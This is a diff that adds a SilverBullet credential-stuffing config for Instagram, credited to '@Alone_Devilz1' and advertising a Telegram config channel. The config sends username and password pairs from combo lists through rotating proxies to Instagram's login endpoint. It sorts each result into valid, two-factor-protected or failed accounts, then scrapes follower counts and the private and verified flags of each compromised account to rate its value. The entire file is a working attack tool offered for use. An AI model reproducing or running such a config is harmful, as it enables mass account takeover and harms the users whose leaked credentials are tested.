@@ -1,0 +1,171 @@
+[SETTINGS]
+{
+  "Name": "instagram Fc New @Alone_Devilz1",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2023-08-14T17:00:26.4926885-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@Alone_Devilz1",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Join : @SilverBullet_Configs1",
+      "VariableName": "",
+      "Id": 2060599161
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Instagram Update @Alone_Devilz1",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION Constant "<PASS>" -> VAR "P" 
+
+FUNCTION Constant "<USER>" -> VAR "U" 
+
+LS Constant "@Alone_Devilz1" -> CAP "Configs by " 
+
+FUNCTION GetRandomUA -> VAR "UA" 
+
+FUNCTION Length "username=<USER>&enc_password=%23PWD_INSTAGRAM_BROWSER%3a0%3a1628896342%3a<PASS>" -> VAR "lngg" 
+
+FUNCTION RegexMatch "([^@]+)" "<USER>" -> VAR "user" 
+
+REQUEST POST "https://www.instagram.com/accounts/login/ajax/" 
+  CONTENT "username=<user>&enc_password=%23PWD_INSTAGRAM_BROWSER%3a0%3a1628896342%3a<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.instagram.com/" 
+  HEADER "X-IG-App-ID: 936619743392459" 
+  HEADER "X-IG-WWW-Claim: 0" 
+  HEADER "X-Instagram-AJAX: c1dcf20d99d7" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "X-CSRFToken: missing" 
+  HEADER "Host: www.instagram.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Length: <lngg>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY ",\"authenticated\":false,\"" 
+    KEY "{\"user\":false,\"" 
+    KEY "Sorry, your password was incorrect" 
+    KEY "\"Sorry, there was a problem with your request.\"" 
+    KEY "\"checkpoint_url\"" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\":\"checkpoint_required\",\"" 
+  KEYCHAIN Success OR 
+    KEY "\",\"authenticated\":true,\"" 
+  KEYCHAIN Retry OR 
+    KEY "\":\"Please wait a few minutes before you try again.\",\"" 
+
+REQUEST GET "https://www.instagram.com/<user>/?next=%2F" 
+  
+  HEADER "Host: www.instagram.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)  Gecko/20103101 Firefox/120.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+
+PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "username" 
+
+PARSE "<SOURCE>" LR "<meta content=\"" " Followers," -> CAP "Followers" 
+
+PARSE "<SOURCE>" LR "Followers, " " Following," -> CAP "Following" 
+
+PARSE "<SOURCE>" LR "Following, " " Posts " -> CAP "Posts" 
+
+PARSE "<SOURCE>" LR "\"is_private\":" "," CreateEmpty=FALSE -> CAP "private" 
+
+PARSE "<SOURCE>" LR "Followers" "," CreateEmpty=FALSE -> CAP "Followers" 
+
+FUNCTION ToUppercase "<private>" -> CAP "private" 
+
+PARSE "<SOURCE>" LR "\"is_verified\":" "," -> VAR "verified" 
+
+FUNCTION ToUppercase "<verified>" -> CAP "verified" 
+
+FUNCTION Replace "," "" "<Followers>" -> CAP "Follower" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Follower>" GreaterThan "1000" 
+    KEY "<Follower>" EqualTo "1000" 
+  KEYCHAIN Success OR 
+    KEY "<Follower>" LessThan "1000" 
+  KEYCHAIN Failure OR 
+    KEY "<h2>Sorry, this page isn&#39;t available.</h2>" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "two_factor_required" 
+
+FUNCTION Constant "@SilverBullet_Configs1" -> CAP "Join :" 
+
+FUNCTION Constant "@Alone_Devilz1" -> CAP "Configs By " 
+
+!REQUEST GET "https://google.com" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
